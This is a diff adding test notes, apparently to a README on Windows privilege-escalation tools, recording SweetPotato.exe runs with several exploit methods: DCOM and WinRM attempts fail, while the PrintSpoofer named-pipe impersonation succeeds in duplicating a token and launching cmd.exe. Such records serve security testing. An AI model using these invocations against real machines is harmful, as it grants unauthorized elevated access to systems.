@@ -66,3 +66,43 @@ PrintSpoofer discovery and original exploit by @itm4n
 C:\Users\Administrator\Desktop>
 
 ```
+
+### SweetPotato.exe -m Thread
+
+`[!] Failed to parse arguments: Could not convert string `Thread' to type ExecutionMethod for option `-m'.`
+
+### SweetPotato.exe -e DCOM
+
+```
+[+] Attempting DCOM NTLM interception with CLID 4991D34B-80A1-4291-83B6-3328366B9097 on port 6666 using method Token to launch c:\Windows\System32\cmd.exe
+[!] No authenticated interception took place, exploit failed
+```
+### SweetPotato.exe -e WinRM
+
+```
+[+] Attempting DCOM NTLM interception with CLID 4991D34B-80A1-4291-83B6-3328366B9097 on port 6666 using method Token to launch c:\Windows\System32\cmd.exe
+[!] No authenticated interception took place, exploit failed
+
+未经处理的异常:  System.Net.Sockets.SocketException: 以一种访问权限不允许的方式做了一个访问套接字的尝试。
+   在 System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
+   在 System.Net.Sockets.Socket.Bind(EndPoint localEP)
+   在 SweetPotato.PotatoAPI.WinRMListener()
+   在 System.Threading.ThreadHelper.ThreadStart_Context(Object state)
+   在 System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)
+   在 System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)
+   在 System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
+   在 System.Threading.ThreadHelper.ThreadStart()
+```
+
+### SweetPotato.exe -e PrintSpoofer
+
+```
+[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
+[+] Triggering notification on evil PIPE \\IIS85-CN/pipe/01ff3c45-6a2b-4788-957f-92612ecdab63
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+```
+
+Successful!
